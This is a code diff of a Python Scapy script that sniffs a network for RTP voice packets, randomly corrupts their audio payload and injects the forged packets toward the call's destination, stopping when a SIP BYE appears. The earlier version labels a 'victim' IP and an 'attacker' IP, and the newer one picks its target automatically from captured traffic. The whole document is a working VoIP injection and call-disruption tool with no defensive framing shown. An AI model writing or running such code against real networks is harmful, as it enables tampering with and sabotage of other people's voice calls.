@@ -1,69 +1,96 @@
-from scapy.all import sniff, IP, UDP, Raw, send
+from scapy.all import sniff, IP, UDP, Raw, send, get_if_addr
 import random
 import time
-import binascii
+import psutil
 
-network_interface = "Wi-Fi"  # Replace with your interface name
+# Global flag for stopping injection
+stop_injection = False
+rtp_started = False  # Flag to track whether RTP injection has started
 
-target_ip = "192.168.137.140"  # Target IP (victim)
-target_port = None  # Will be extracted from captured packets
+# Function to list network interfaces
+def list_interfaces():
+    interfaces = []
+    print("\nAvailable Network Interfaces:")
+    for idx, (name, addrs) in enumerate(psutil.net_if_addrs().items()):
+        print(f"{idx + 1}. {name}")
+        interfaces.append(name)
+    
+    return interfaces
 
-source_ip = "192.168.137.93"  # Attacker IP
-source_port = 12345  # Random attacker port
+# Prompt user to select network interface
+def select_interface():
+    interfaces = list_interfaces()
+    while True:
+        try:
+            choice = int(input("Select the network interface (number): ")) - 1
+            if 0 <= choice < len(interfaces):
+                return interfaces[choice]
+            else:
+                print("Invalid selection. Try again.")
+        except ValueError:
+            print("Please enter a valid number.")
+
+network_interface = select_interface()
+source_ip = get_if_addr(network_interface)  # IP from the device
+source_port = random.randint(1024, 65535)  # Dynamic Port
+target_ip = None  # From RTP packte
+rtp_flows = {}
 
 def generate_dynamic_payload(payload):
-    """
-    Modify the captured payload to create dynamic packets.
-    """
     payload = bytearray(payload)
-    
     # Example: Randomly modify bytes in the payload
-    for i in range(12, len(payload), 8):  # Skip the RTP header (12 bytes)
+    for i in range(12, len(payload), 8):  # Skip RTP header (12 bytes)
         payload[i] = random.randint(0, 255)
     
     return bytes(payload)
 
 def inject_rtp_packet(original_packet):
-    """
-    Inject a modified RTP packet based on the captured packet.
-    """
-    global target_port
+    global target_ip, stop_injection, rtp_started
 
-    # Extract RTP payload from the captured packet
-    if Raw in original_packet:
-        captured_payload = original_packet[Raw].load
-    else:
-        return  # Skip packets without a payload
+    if stop_injection or Raw not in original_packet:
+        return  # Stop injecting when flag is set
+    
+    rtp_started = True  # Set flag to indicate RTP injection has started
 
-    # Generate a dynamic payload
+    captured_payload = original_packet[Raw].load
     dynamic_payload = generate_dynamic_payload(captured_payload)
 
-    # Extract target port from the captured packet
-    target_port = original_packet[UDP].dport
+    src_ip = original_packet[IP].src
+    dst_ip = original_packet[IP].dst
+    src_port = original_packet[UDP].sport
+    dst_port = original_packet[UDP].dport
+    
+    # Track RTP flows dynamically
+    rtp_flows[(src_ip, dst_ip, src_port, dst_port)] = time.time()
+    target_ip = dst_ip
 
-    # Create the IP and UDP layers
     ip = IP(src=source_ip, dst=target_ip)
-    udp = UDP(sport=source_port, dport=target_port)
-
-    # Create the RTP packet with modified payload
+    udp = UDP(sport=source_port, dport=dst_port)
     packet = ip / udp / Raw(load=dynamic_payload)
-
-    # Send the modified packet
+    
     send(packet, verbose=False)
-    print(f"Injected modified RTP packet to {target_ip}:{target_port}")
+    print(f"Injected modified RTP packet to {target_ip}:{dst_port}")
 
 def packet_callback(packet):
+    global stop_injection, rtp_started
+
+    if stop_injection:
+        return  # Stop processing packets when flag is set
+    
     if UDP in packet and Raw in packet:
-        # Analyze RTP payload type (dynamic range for OPUS is typically 96-127)
-        rtp_payload_type = packet[Raw].load[1] & 0x7F
-        if 96 <= rtp_payload_type <= 127:
+        payload = packet[Raw].load
+
+        # Only check for SIP BYE if RTP has already started
+        if rtp_started and b"BYE" in payload:
+            print("SIP BYE detected. Stopping injection and exiting.")
+            stop_injection = True
+
+        rtp_payload_type = payload[1] & 0x7F  # Extract payload type
+        if 96 <= rtp_payload_type <= 127:  # Dynamic RTP payload type range
             print(f"Captured RTP packet from {packet[IP].src}:{packet[UDP].sport}")
             inject_rtp_packet(packet)
 
 def start_sniffing():
-    """
-    Start sniffing RTP packets on the specified network interface.
-    """
     print(f"Sniffing for RTP packets on interface {network_interface}...")
     sniff(iface=network_interface, filter="udp", prn=packet_callback, store=False)
 
